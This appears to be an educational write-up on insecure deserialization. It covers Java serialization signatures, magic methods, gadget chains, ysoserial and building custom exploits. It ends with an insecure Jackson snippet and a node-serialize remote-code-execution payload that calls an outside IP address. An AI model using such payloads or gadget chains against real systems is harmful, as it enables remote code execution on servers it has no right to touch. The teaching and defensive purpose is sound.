## Insecure Deserialization

The concept of serialization (and deserialization) has existed in computer science for a number of years. Its purpose is to convert a data structure into a format that can be stored or transmitted over a network link for future consumption.

On a very high level it involves a "producer" and a "consumer" of the serialized object.
In other words, an application can define and instantiate an arbitrary object and modify its state in some way. It can then store the state of that object in the appropriate format using serialization.
As long as the format is understood by the "consumer" application, the object can be recreated in the process space of the consumer and further processed as desired.

As it so happens, many useful programming constructs can also be used for more nefarious reasons if they're implemented in an unsafe manner.

### How to identify insecure deserialization
         
Identifying insecure deserialization is relatively simple regardless of whether you are whitebox or blackbox testing.       
           
During auditing, you should look at all data being passed into the website and try to identify anything that looks like serialized data.

Serialized data can be identified relatively easily if you know the format that different languages use. Once you identify serialized data, you can test whether you are able to control it.     

### Java serialization format           

Some languages, such as Java, use binary serialization formats.
This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs.
For example, serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.       
         
Any class that implements the interface java.io.Serializable can be serialized and deserialized. If you have source code access, take note of any code that uses the readObject() method, which is used to read and deserialize data from an InputStream.

### Manipulating serialized objects
 
Exploiting some deserialization vulnerabilities can be as easy as changing an attribute in a serialized object.
As the object state is persisted, you can study the serialized data to identify and edit interesting attribute values.
You can then pass the malicious object into the website via its deserialization process.
This is the initial step for a basic deserialization exploit.       
       

Broadly speaking, there are two approaches you can take when manipulating serialized objects.

    You can either edit the object directly in its byte stream form
    You can write a short script in the corresponding language to create and serialize the new object yourself. 
    The latter approach is often easier when working with binary serialization formats.


### Magic methods
           
Magic methods are a special subset of methods that you do not have to explicitly invoke.
Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name  with double-underscores.       
           
Developers can add magic methods to a class in order to predetermine what code should be executed when the corresponding event  or scenario occurs.
Exactly when and why a magic method is invoked differs from method to method.
One of the most common examples in PHP is  __construct(), which is invoked whenever an object of the class is instantiated, similar to Python's __init__.  Typically, constructor magic methods like this contain code to initialize the attributes of the instance.
However, magic methods can be customized by developers to execute any code they want.       
           
Magic methods are widely used and do not represent a vulnerability on their own.
But they can become dangerous when the code that they execute handles attacker-controllable data, for example, from a  deserialized object.
This can be exploited by an attacker to automatically invoke methods on the deserialized data when the corresponding conditions are met.       
                         
Most importantly in this context, some languages have magic methods that are invoked automatically during the deserialization process.

For example, PHP's unserialize() method looks for and invokes an object's __wakeup() magic method.       
           
In Java deserialization, the same applies to the readObject() method, which essentially acts like a constructor for "re-initializing" a serialized object.
The ObjectInputStream.readObject() method is used to read data from the initial byte stream. However, serializable classes can also declare their own readObject() methods as follows:       
            private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {...};        
           
This allows the class to control the deserialization of its own fields more closely. Crucially, a readObject() method declared in exactly this way acts as a magic method that is invoked during deserialization.       
           
You should pay close attention to any classes that contain these types of magic methods. They allow you to pass data from a  serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced  exploits.       

Injecting arbitrary objects
           
As we've seen, it is occasionally possible to exploit insecure deserialization by simply editing the object supplied by the website. However, injecting arbitrary object types can open up many more possibilities.       
           
In object-oriented programming, the methods available to an object are determined by its class.
Therefore, if an attacker can manipulate which class of object is being passed in as serialized data,  they can influence what code is executed after, and even during, deserialization.       
           
Deserialization methods do not typically check what they are deserializing.
This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized.

This effectively allows an attacker to create instances of arbitrary classes. The fact that this object is not of the expected class does not matter.
The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then.       
           
If an attacker has access to the source code, they can study all of the available classes in detail.
To construct a simple exploit, they would look for classes containing deserialization magic methods, then check whether any of them perform dangerous operations on controllable data.
The attacker can then pass in a serialized object of  this class to use its magic method for an exploit.                 
           
Classes containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of  method invocations, known as a "gadget chain".

### Gadget chains
           
A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal.
An individual gadget may not directly do anything harmful with user input. 
However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget.

By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage.       
           
It is important to understand that, unlike some other types of exploit, a gadget chain is not a payload of chained methods  constructed by the attacker.
All of the code already exists on the website.

The only thing the attacker controls is the data that is passed into the gadget chain.
This is typically done using a magic method that is invoked during deserialization, sometimes known as a "kick-off  gadget".       
           
In the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains. |
This can sometimes be a simple one or two-step chain, but constructing  high-severity attacks will likely require a more elaborate sequence of object instantiations and method invocations.

Therefore, being able to construct gadget chains is one of the key aspects of successfully exploiting insecure deserialization.

Working with pre-built gadget chains

Manually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access.  Fortunately, there are a few options for working with pre-built gadget chains that you can try first.                 

    There are several tools available that can help you construct gadget chains with minimal effort.
    These tools provide a range of pre-discovered gadget chains that have been exploited on other websites.
    Having identified an insecure deserialization vulnerability on your target site, you can use these tools to try and exploit it, even if you do not have access to the source code.

    This approach is made  possible due to the widespread use of libraries that contain exploitable  gadget chains. For example, if a gadget chain that relies on Java's Apache Commons Collections library can be exploited on one website, any other website that implements this library may also be exploitable using the same chain.       
    One such tool for Java deserialization exploits is  "ysoserial".
    You simply specify a library that you think the target application is using, then provide a command that you want to try and  execute.
    The tool creates an appropriate serialized object based on a gadget chain it knows for the given library.
    This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gadget chains manually.       


### Creating your own exploit
           
When off-the-shelf gadget chains and documented exploits are unsuccessful, you will need to create your own exploit.       
           
To successfully build your own gadget chain, you will almost certainly need source code access.
The first step is to study this source code to identify a class that contains a magic method that is invoked during deserialization. Assess the code that this magic method executes to see if it directly does anything dangerous with user-controllable attributes.
This is always worth checking just in case.       
           
If the magic method is not exploitable on its own, it can serve as your "kick-off gadget" for a gadget chain.
Study any methods that the kick-off gadget invokes.
Do any of these do something dangerous with data that you control? If not, take a closer look at each of the methods that they subsequently invoke, and so on.       
           
Repeat this process, keeping track of which values you have access to, until you either reach a dead end or identify a dangerous sink gadget into which your controllable data is passed.       
           
Once you've worked out how to successfully construct a gadget chain within the application code, the next step is to create a  serialized object containing your payload.

This is simply a case of studying the class declaration in the source code and creating a valid serialized object with the appropriate values required for your exploit. This is relatively simple when working with string-based serialization formats.       
           
Working with binary formats, such as when constructing a Java deserialization exploit, can be particularly cumbersome.
When making minor changes to an existing object, you might be comfortable working directly with the bytes. However, when making more significant changes, such as passing in a completely new object, this quickly becomes impractical.

It is often much simpler to write your own code in the target language in order to generate and serialize the data yourself.         
When creating your own gadget chain, look out for opportunities to use this extra attack surface to trigger secondary vulnerabilities.   

By carefully studying the source code, you can discover longer gadget chains that potentially allow you to construct high-severity attacks, often including remote code execution.

### Examples

Insecure Jackson deserialization example: 

```java
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
String json = "["com.sun.org.apache.xml.internal.utils.SerializableLocatorImpl", {}]"; 
try { 
    mapper.readValue(json, Object.class);
} catch (IOException e) { 
    e.printStackTrace(); 
}
```

Insecure node deserialization example: 

```javascript
#!/usr/bin/node 

var serialize = require('node-serialize'); 
var x = '{"rce":"_$$ND_FUNC$$_function (){var http = require(\'http\'); http.get(\'http://18.185.172.127:42024/hacked\')}()"}'
serialize.unserialize(x);
```
